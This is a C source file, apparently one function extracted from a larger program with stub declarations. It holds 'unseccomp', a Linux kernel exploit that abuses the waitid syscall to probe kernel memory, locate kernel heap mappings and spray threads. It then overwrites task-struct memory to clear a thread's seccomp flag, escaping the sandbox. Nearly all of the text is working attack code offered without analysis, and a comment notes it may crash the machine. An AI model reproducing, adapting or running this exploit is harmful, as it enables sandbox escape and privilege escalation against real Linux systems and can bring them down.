#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  FUTEX_WAKE ; 
 int /*<<< orphan*/  INT_MAX ; 
 int NUM_THREAD_SPRAY ; 
 int /*<<< orphan*/  P_ALL ; 
 int /*<<< orphan*/  SYS_waitid ; 
 int /*<<< orphan*/  WEXITED ; 
 int barrier1 ; 
 int barrier2 ; 
 int errno ; 
 scalar_t__ found_one ; 
 int /*<<< orphan*/  futex (int*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 unsigned long g_addr_guess ; 
 int /*<<< orphan*/ * g_threads ; 
 unsigned long mapping_begin ; 
 unsigned long mapping_end ; 
 int num_threads ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 scalar_t__ pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pthread_join (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  sleep (int) ; 
 unsigned long spray_offset ; 
 int syscall (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,unsigned long,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  thread_attr ; 
 int /*<<< orphan*/  thread_guy ; 
 int threads_run ; 
 int /*<<< orphan*/  usleep (int) ; 

void unseccomp() {
  // first we spin up a lot of threads
  // let's try 10k
  // and then we try overwriting the TIF_SECCOMP flag in the task struct
  int i;

  unsigned long curr_guess = 0xffff800000000000;
  int j;
  while(1) {
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      mapping_begin = curr_guess;
      printf("found mapping at %p\n", (void*)curr_guess);
      break;
    }
    curr_guess += 0x10000000;
  }
  // check if mapping extends higher?
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno == 14) {
      printf("found mapping end at %p\n", (void*)curr_guess);
      mapping_end = curr_guess;
      curr_guess -= 0x10000000;
      break;
    }
  }
  
  
  // start threads
  barrier1 = 0;
  barrier2 = 0;
  for (i = 0; i < NUM_THREAD_SPRAY; i++) {
    num_threads = i;
    if(pthread_create(&g_threads[i], &thread_attr, thread_guy, NULL)) {
      printf("pthread create error\n");
      printf("%d\n", i);
      break;
    }
  }
  printf("%d threads created\n", num_threads);
  
  /***** find the kernel heap *******/
  unsigned long last_mapping_start;
  unsigned long last_mapping_end;
  
  unsigned long second_mapping;
  unsigned long second_mapping_end;
  usleep(100000);
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found second mapping at %p\n", (void*)curr_guess);
      //mapping_end = curr_guess;
      second_mapping = curr_guess;
      last_mapping_start = second_mapping;
      curr_guess -= 0x10000000;
      break;
    }
  }
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno == 14) {
      printf("found second mapping end at %p\n", (void*)curr_guess);
      second_mapping_end = curr_guess;
      last_mapping_end = second_mapping_end;
      curr_guess -= 0x10000000;
      break;
    }
  }


  unsigned long third_mapping = 0;
  unsigned long third_mapping_end;
  usleep(100000);
  while(curr_guess < second_mapping_end+0x100000000) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found third mapping at %p\n", (void*)curr_guess);
      third_mapping = curr_guess;
      last_mapping_start = third_mapping;
      curr_guess -= 0x10000000;
      break;
    }
  }
  if (third_mapping) {
    while(1) {
      curr_guess += 0x10000000;
      // try writing
      int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
      if (errno == 14) {
        printf("found third mapping end at %p\n", (void*)curr_guess);
        third_mapping_end = curr_guess;
        last_mapping_end = third_mapping_end;
        curr_guess -= 0x10000000;
        break;
      }
    }
  }
  /***** done finding the kernel heap *******/
  
  /****** start overwriting from low addresses to high and hope we unset the seccomp flag ******/
  // some start guess found by experimenting, could be very wrong on some systems
  curr_guess = last_mapping_end-0x100000000;
  printf("last_mapping is 0x%lx bytes\n", last_mapping_end-last_mapping_start);
  printf("min guess %lx\n", curr_guess);
  printf("starting guessing\n");
  printf("this part can take up to a minute, or crash the machine :)\n");
  i = 0;
  while(!found_one) {
    curr_guess += 0x800000;
    unsigned long guess_val = curr_guess + spray_offset;
    // try writing
    syscall(SYS_waitid, P_ALL, 0, guess_val-26, WEXITED, NULL);
    g_addr_guess = guess_val;
    // let the threads check
    barrier2 = 0;
    threads_run = 0;
    barrier1 = 1;
    futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    while(threads_run < num_threads) {
      if (found_one) {
        // one of the threads is free from seccomp
        // wake from barriers first
        barrier1=1;
        barrier2=1;
        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        printf("joining threads\n");
        for(i = 0; i < num_threads; i++) {
          pthread_join(g_threads[i], NULL);
        }
        printf("done joining threads\n");        
        
        sleep(1000);
      }
      usleep(10000);
    }
    
    // make sure threads are reset
    barrier2 = 1;
    barrier1 = 0;
    futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    while(threads_run < num_threads*2) {
      if (found_one) {
        printf("apparently we found one sleep forever\n");
        // wake from barriers first
        barrier1=1;
        barrier2=1;
        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        printf("joining threads\n");
        for(i = 0; i < num_threads; i++) {
          pthread_join(g_threads[i], NULL);
        }
        printf("done joining threads\n");    
        sleep(100000);
      }
      usleep(10000);
    }
    threads_run = 0;
    barrier2 = 0;
    i += 1;  
  }
}